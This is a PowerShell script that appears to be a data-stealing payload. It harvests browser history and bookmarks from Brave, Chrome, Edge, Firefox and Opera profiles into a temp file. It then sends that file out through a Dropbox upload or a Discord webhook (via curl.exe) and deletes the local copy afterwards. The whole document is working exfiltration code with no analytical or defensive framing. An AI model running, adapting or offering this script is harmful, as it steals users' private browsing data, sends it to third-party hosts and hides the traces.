$regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

function Get-BrowserData {
    [CmdletBinding()]
    
    param (	
    	[Parameter (Position=1,Mandatory = $True)]
    	[string]$Path,
    	[Parameter (Position=1,Mandatory = $True)]
    	[string]$Browser,
    	[Parameter (Position=1,Mandatory = $True)]
    	[string]$DataType,
    	[Parameter (Position=1,Mandatory = $False)]
    	[string]$Profile
    ) 

    $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} | Sort -Unique
    $Value | ForEach-Object {
        $Key = $_
        if ($Key -match $Search){
            New-Object -TypeName PSObject -Property @{
                User = $env:UserName
                Browser = $Browser
                DataType = $DataType
                Data = $_
            }
        }
    } 
}

$FileName = "$env:USERNAME-BrowserData-$(get-date -f yyyy-MM-dd_hh-mm-ss).txt"

$browsers = @('brave', 'chrome', 'edge', 'firefox', 'opera')

foreach ($browser in $browsers) {
    if ($browser -eq 'brave') {
	$Brave_Profiles = Get-ChildItem -Path "$Env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\" -Directory | Where-Object { $_.Name -like "Profile*" } | Select-Object -ExpandProperty Name
	
	if ($Brave_Profiles) {
	    $Brave_Profiles | ForEach-Object {
	        $profile = $_
	 	$path_history = "$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\" + $profile + "\History"
   		$path_bookmarks = "$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\" + $Profile + "\Bookmarks"
	        Get-BrowserData -Browser $browser -DataType "history" -Profile $profile -Path $path_history >> $env:TMP\$FileName
	        Get-BrowserData -Browser $browser -DataType "bookmarks" -Profile $profile -Path $path_bookmarks >> $env:TMP\$FileName
	    }
	} else {
 	    $path_history = "$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History"
	    $path_bookmarks = "$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Bookmarks"
	    Get-BrowserData -Browser $browser -DataType "history" -Path $path_history >> $env:TMP\$FileName
	    Get-BrowserData -Browser $browser -DataType "bookmarks" -Path $path_bookmarks >> $env:TMP\$FileName
	}
    } elseif ($browser -eq 'chrome') {
    	$path_history = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
	$path_bookmarks = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
	Get-BrowserData -Browser $browser -DataType "history" -Path $path_history >> $env:TMP\$FileName
	Get-BrowserData -Browser $browser -DataType "bookmarks" -Path $path_bookmarks >> $env:TMP\$FileName
    } elseif ($browser -eq 'edge') {
    	$path_history = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\History"
	$path_bookmarks = "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks"
	Get-BrowserData -Browser $browser -DataType "history" -Path $path_history >> $env:TMP\$FileName
	Get-BrowserData -Browser $browser -DataType "bookmarks" -Path $path_bookmarks >> $env:TMP\$FileName
    } elseif ($browser -eq 'firefox') {
    	$path_history = "$env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
	Get-BrowserData -Browser $browser -DataType "history" -Path $path_history >> $env:TMP\$FileName
    } elseif ($browser -eq 'opera') {
        $Opera = Get-ChildItem -Path "$env:USERPROFILE\AppData\Roaming\Opera Software\" | Where-Object { $_.Name -like "Opera*" } | Select-Object -ExpandProperty Name
	$path_history = "$env:USERPROFILE\AppData\Roaming\Opera Software\" + $Opera + "\Default\History"
	$path_bookmarks = "$env:USERPROFILE\AppData\Roaming\Opera Software\" + $Opera + "\Default\Bookmarks"
	Get-BrowserData -Browser $browser -DataType "history" -Path $path_history >> $env:TMP\$FileName
	Get-BrowserData -Browser $browser -DataType "bookmarks" -Path $path_bookmarks >> $env:TMP\$FileName
    }
}

# Get DropBox access_token

function get_access_token {
    $Body = @{
        grant_type    = "refresh_token"
	refresh_token = $refresh_token
        client_id     = $app_key
        client_secret = $app_secret
    }
    
    $response = Invoke-RestMethod -Uri "https://api.dropbox.com/oauth2/token" -Method Post -Body $Body -ContentType "application/x-www-form-urlencoded"

    return $response.access_token
}

# Upload output file to dropbox

function DropBox-Upload {
    [CmdletBinding()]
    
    param (
	[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
    	[Alias("f")]
    	[string]$SourceFilePath
    )
    
    $outputFile = Split-Path $SourceFilePath -leaf
    $TargetFilePath="/$outputFile"
    $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
    $db = get_access_token
    $authorization = "Bearer " + $db
    $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
    $headers.Add("Authorization", $authorization)
    $headers.Add("Dropbox-API-Arg", $arg)
    $headers.Add("Content-Type", 'application/octet-stream')
    Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
}

if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TMP\$FileName}

#------------------------------------------------------------------------------------------------------------------------------------

function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0,Mandatory=$False)]
        [string]$file,
        [parameter(Position=1,Mandatory=$False)]
        [string]$text 
    )

    $hookurl = "$dc"

    $Body = @{
      'username' = $env:username
      'content' = $text
    }

    if (-not ([string]::IsNullOrEmpty($text))){
    Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

    if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP\$FileName}

############################################################################################################################################################
RI $env:TEMP\$FileName
